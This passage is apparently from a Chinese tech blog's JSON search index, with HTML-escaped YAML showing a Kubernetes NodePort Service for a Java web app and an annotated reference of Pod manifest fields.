class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nn\"\u003e---\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003eapiVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ev1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ekind\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eService\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003elabels\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eapp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003enamespace\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eops\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eports\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web-port\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e8889\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eprotocol\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eTCP\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003etargetPort\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e8889\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003enodePort\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e30009\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eselector\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eapp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003esessionAffinity\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eNone\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eNodePort\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003estatus\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eloadBalancer\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e{}\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上面忽略了启动命令，其实容器内的启动命令也是很有学问的。\u003c/p\u003e","title":"Java业务上kubernetes的注意点"},{"content":"Pod的yaml文件的资源清单和解释，备查 apiVersion: v1 #必选，版本号，例如v1 kind: Pod #必选，资源类型，例如 Pod metadata: #必选，元数据 name: string #必选，Pod名称 namespace: string #Pod所属的命名空间,默认为\u0026#34;default\u0026#34; labels: #自定义标签列表 - name: string spec: #必选，Pod中容器的详细定义 containers: #必选，Pod中容器列表 - name: string #必选，容器名称 image: string #必选，容器的镜像名称 imagePullPolicy: [ Always|Never|IfNotPresent ] #获取镜像的策略 command: [string] #容器的启动命令列表，如不指定，使用打包时使用的启动命令 args: [string] #容器的启动命令参数列表 workingDir: string #容器的工作目录 volumeMounts: #挂载到容器内部的存储卷配置 - name: string #引用pod定义的共享存储卷的名称，需用volumes[]部分定义的的卷名 mountPath: string #存储卷在容器内mount的绝对路径，应少于512字符 readOnly: boolean #是否为只读模式 ports: #需要暴露的端口库号列表 - name: string #端口的名称 containerPort: int #容器需要监听的端口号 hostPort: int #容器所在主机需要监听的端口号，默认与Container相同 protocol: string #端口协议，支持TCP和UDP，默认TCP env: #容器运行前需设置的环境变量列表 - name: string #环境变量名称 value: string #环境变量的值 resources: #资源限制和请求的设置 limits: #资源限制的设置 cpu: string #Cpu的限制，单位为core数，将用于docker run --cpu-shares参数 memory: string #内存限制，单位可以为Mib/Gib，将用于docker run --memory参数 requests: #资源请求的设置 cpu: string #Cpu请求，容器启动的初始可用数量 memory: string #内存请求,容器启动的初始可用数量 lifecycle: #生命周期钩子 postStart: #容器启动后立即执行此钩子,如果执行失败,会根据重启策略进行重启 preStop: #容器终止前执行此钩子,无论结果如何,容器都会终止 livenessProbe: #对Pod内各容器健康检查的设置，当探测无响应几次后将自动重启该容器 exec: #对Pod容器内检查方式设置为exec方式 command: [string] #exec方式需要制定的命令或脚本 httpGet: #对Pod内个容器健康检查方法设置为HttpGet，需要制定Path、port path: string port: number host: string scheme: string HttpHeaders: - name: string value: string tcpSocket: #对Pod内个容器健康检查方式设置为tcpSocket方式 port: number initialDelaySeconds: 0 #容器启动完成后首次探测的时间，单位为秒 timeoutSeconds: 0 #对容器健康检查探测等待响应的超时时间，单位秒，默认1秒 periodSeconds: 0 #对容器监控检查的定期探测时间设置，单位秒，默认10秒一次 successThreshold: 0 failureThreshold: 0 securityContext: privileged: false restartPolicy: [Always | Never | OnFailure] #Pod的重启策略 nodeName: \u0026lt;string\u0026gt; #设置NodeName表示将该Pod调度到指定到名称的node节点上 nodeSelector: obeject #设置NodeSelector表示将该Pod调度到包含这个label的node上 imagePullSecrets: #Pull镜像时使用的secret名称，以key：secretkey格式指定 - name: string hostNetwork: false #是否使用主机网络模式，默认为false，如果设置为true，表示使用宿主机网络 volumes: #在该pod上定义共享存储卷列表 - name: string #共享存储卷名称 （volumes类型有很多种） emptyDir: {} #类型为emtyDir的存储卷，与Pod同生命周期的一个临时目录。为空值 hostPath: string #类型为hostPath的存储卷，表示挂载Pod所在宿主机的目录 path: string #Pod所在宿主机的目录，将被用于同期中mount的目录 secret: #类型为secret的存储卷，挂载集群与定义的secret对象到容器内部 scretname: string items: - key: string path: string configMap: #类型为configMap的存储卷，挂载预定义的configMap对象到容器内部 name: string items: - key: string path: string 在kubernetes中基本所有资源的一级属性都是一样的，主要包含5部分：\napiVersion 版本，由kubernetes内部定义，版本号必须可以用 kubectl api-versions 查询到 kind 类型，由kubernetes内部定义，版本号必须可以用 kubectl api-resources 查询到 metadata 元数据，主要是资源标识和说明，常用的有name、namespace、labels等 spec 描述，这是配置中最重要的一部分，里面是对各种资源配置的详细描述 status 状态信息，里面的内容不需要定义，由kubernetes自动生成 spec描述是主要关注的：\ncontainers \u0026lt;[]Object\u0026gt; 容器列表，用于定义容器的详细信息 nodeName 根据nodeName的值将pod调度到指定的Node节点上 nodeSelector \u0026lt;map[]\u0026gt; 根据NodeSelector中定义的信息选择将该Pod调度到包含这些label的Node 上 hostNetwork 是否使用主机网络模式，默认为false，如果设置为true，表示使用宿主机网络 volumes \u0026lt;[]Object\u0026gt; 存储卷，用于定义Pod上面挂在的存储信息 restartPolicy 重启策略，表示Pod在遇到故障的时候的处理策略 ","permalink":"https://rendoumi.com/posts/20240119-k8s_resource/","summary":"\u003ch3 id=\"pod的yaml文件的资源清单和解释备查\"\u003ePod的yaml文件的资源清单和解释，备查\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003eapiVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ev1    \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#必选，版本号，例如v1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ekind\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ePod       　\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#必选，资源类型，例如 Pod\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e       　 \u003c/span\u003e\u003cspan class=\"c\"\u003e#必选，元数据\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring    \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#必选，Pod名称\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003enamespace\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#Pod所属的命名空间,默认为\u0026#34;default\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003elabels\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e       　　  \u003c/span\u003e\u003cspan class=\"c\"\u003e#自定义标签列表\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring      　          \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e#必选，Pod中容器的详细定义\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003econtainers\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e#必选，Pod中容器列表\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring  \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#必选，容器名称\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#必选，容器的镜像名称\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eimagePullPolicy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eAlways|Never|IfNotPresent ] \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#获取镜像的策略 \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003ecommand\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"l\"\u003estring]  \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#容器的启动命令列表，如不指定，使用打包时使用的启动命令\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eargs\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"l\"\u003estring]     \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#容器的启动命令参数列表\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eworkingDir\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#容器的工作目录\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003evolumeMounts\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"c\"\u003e#挂载到容器内部的存储卷配置\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring     \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#引用pod定义的共享存储卷的名称，需用volumes[]部分定义的的卷名\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003emountPath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#存储卷在容器内mount的绝对路径，应少于512字符\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ereadOnly\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eboolean\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#是否为只读模式\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eports\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#需要暴露的端口库号列表\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring       \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#端口的名称\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003econtainerPort\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eint \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#容器需要监听的端口号\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ehostPort\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eint      \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#容器所在主机需要监听的端口号，默认与Container相同\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eprotocol\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring   \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#端口协议，支持TCP和UDP，默认TCP\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"c\"\u003e#容器运行前需设置的环境变量列表\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#环境变量名称\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#环境变量的值\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eresources\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#资源限制和请求的设置\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003elimits\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e#资源限制的设置\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ecpu\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring    \u003c/span\u003e\u003cspan class=\"w\"\u003e 